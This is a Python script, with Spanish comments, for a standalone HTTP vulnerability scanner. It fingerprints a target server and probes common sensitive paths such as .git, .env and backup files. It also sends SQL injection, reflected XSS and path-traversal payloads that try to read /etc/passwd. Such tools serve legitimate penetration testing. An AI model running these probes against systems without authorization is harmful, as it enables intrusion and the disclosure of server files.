#!/usr/bin/env python3
"""
HTTP Vulnerability Scanner Standalone
Zero dependencias - Usa solo librería estándar Python
Funciona contra cualquier objetivo real
"""

import urllib.request
import urllib.parse
import urllib.error
import ssl
import sys
import re

class HTTPScanner:
    def __init__(self, target, port=80):
        self.target = target
        self.port = port
        self.base_url = f"http://{target}:{port}"
        self.ctx = ssl.create_default_context()
        self.ctx.check_hostname = False
        self.ctx.verify_mode = ssl.CERT_NONE
        
    def request(self, url, timeout=8):
        """Peticion HTTP pura sin dependencias"""
        try:
            req = urllib.request.Request(
                url,
                headers={'User-Agent': 'Mozilla/5.0 ExploitHunter/1.0'}
            )
            resp = urllib.request.urlopen(req, timeout=timeout, context=self.ctx)
            return {
                'status': resp.status,
                'headers': dict(resp.headers),
                'body': resp.read().decode('utf-8', errors='ignore')
            }
        except urllib.error.HTTPError as e:
            return {
                'status': e.code,
                'headers': dict(e.headers),
                'body': e.read().decode('utf-8', errors='ignore')
            }
        except Exception as e:
            return None
    
    def check_server(self):
        """Identificar servidor y tecnologias"""
        print(f"\n[*] Target: {self.target}:{self.port}")
        print(f"[*] URL: {self.base_url}")
        
        result = self.request(self.base_url)
        if not result:
            print(f"[-] No se puede conectar a {self.base_url}")
            return False
        
        server = result['headers'].get('Server', 'Desconocido')
        print(f"\n[+] SERVIDOR DETECTADO:")
        print(f"    {server}")
        
        # Detectar tecnologias extra
        techs = []
        if 'X-Powered-By' in result['headers']:
            techs.append(result['headers']['X-Powered-By'])
        if 'Set-Cookie' in result['headers']:
            if 'PHPSESSID' in result['headers']['Set-Cookie']:
                techs.append('PHP')
            if 'JSESSIONID' in result['headers']['Set-Cookie']:
                techs.append('Java')
        
        if techs:
            print(f"\n[+] TECNOLOGIAS:")
            for t in techs:
                print(f"    {t}")
        
        # Analizar contenido
        body = result['body']
        if '<title>' in body:
            title = re.findall(r'<title>(.*?)</title>', body, re.I)
            if title:
                print(f"\n[+] TITULO: {title[0]}")
        
        return True
    
    def scan_directories(self):
        """Escanear directorios comunes"""
        print(f"\n[*] ESCANEANDO DIRECTORIOS...")
        
        wordlist = [
            'admin', 'backup', 'config', 'wp-admin', 'phpmyadmin',
            '.git', '.env', 'robots.txt', 'test', 'dev', 'api',
            'login', 'wp-login.php', 'administrator', 'panel',
            'shell', 'cmd', 'upload', 'images', 'css', 'js',
            'includes', 'tmp', 'logs', 'old', 'backup.zip'
        ]
        
        found = 0
        for directory in wordlist:
            url = f"{self.base_url}/{directory}"
            result = self.request(url, timeout=5)
            
            if result:
                status = result['status']
                if status in [200, 301, 302, 403]:
                    size = len(result['body'])
                    print(f"    /{directory} -> {status} ({size} bytes)")
                    found += 1
        
        print(f"\n    Total encontrados: {found}")
        return found
    
    def test_sqli(self):
        """Test de SQL Injection"""
        print(f"\n[*] TESTEANDO SQL INJECTION...")
        
        payloads = [
            "'",
            "1' OR '1'='1",
            '1" OR "1"="1',
            "1' OR 1=1--",
            "' OR '1'='1' --"
        ]
        
        vulnerable = False
        for payload in payloads:
            params = urllib.parse.urlencode({'id': payload})
            url = f"{self.base_url}?{params}"
            result = self.request(url, timeout=10)
            
            if result:
                body = result['body'].lower()
                # Patrones de error SQL
                if any(e in body for e in ['sql syntax', 'mysql error', 'sqlite', 'ora-', 'postgresql']):
                    print(f"    [!] POSIBLE SQLi: {payload}")
                    vulnerable = True
        
        if not vulnerable:
            print(f"    [-] No se detecto SQLi")
        
        return vulnerable
    
    def test_xss(self):
        """Test de Cross-Site Scripting"""
        print(f"\n[*] TESTEANDO XSS...")
        
        payload = "<script>alert('XSS')</script>"
        params = urllib.parse.urlencode({'q': payload, 'search': payload})
        url = f"{self.base_url}?{params}"
        result = self.request(url, timeout=10)
        
        if result and payload in result['body']:
            print(f"    [!] XSS REFLEJADO DETECTADO!")
            return True
        
        print(f"    [-] No se detecto XSS")
        return False
    
    def test_lfi(self):
        """Test de Local File Inclusion"""
        print(f"\n[*] TESTEANDO LFI...")
        
        payloads = [
            '../../../etc/passwd',
            '....//....//....//etc/passwd',
            '/etc/passwd',
            '..%2f..%2f..%2fetc%2fpasswd'
        ]
        
        for payload in payloads:
            params = urllib.parse.urlencode({'file': payload, 'page': payload})
            url = f"{self.base_url}?{params}"
            result = self.request(url, timeout=10)
            
            if result and 'root:' in result['body']:
                print(f"    [!] LFI DETECTADO!")
                print(f"    [!] Contenido de /etc/passwd:")
                for line in result['body'].split('\n'):
                    if 'root:' in line:
                        print(f"        {line.strip()}")
                return True
        
        print(f"    [-] No se detecto LFI")
        return False
    
    def run_all(self):
        """Ejecutar escaneo completo"""
        print("=" * 50)
        print("   HTTP VULNERABILITY SCANNER")
        print("   Standalone - Zero Dependencies")
        print("=" * 50)
        
        if not self.check_server():
            return
        
        self.scan_directories()
        self.test_sqli()
        self.test_xss()
        self.test_lfi()
        
        print("\n" + "=" * 50)
        print("   ESCANEO COMPLETADO")
        print("=" * 50)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: python3 http_scanner_standalone.py <target> [port]")
        print("Ejemplo: python3 http_scanner_standalone.py scanme.nmap.org")
        print("Ejemplo: python3 http_scanner_standalone.py ejemplo.com 8080")
        sys.exit(1)
    
    target = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    
    scanner = HTTPScanner(target, port)
    scanner.run_all()
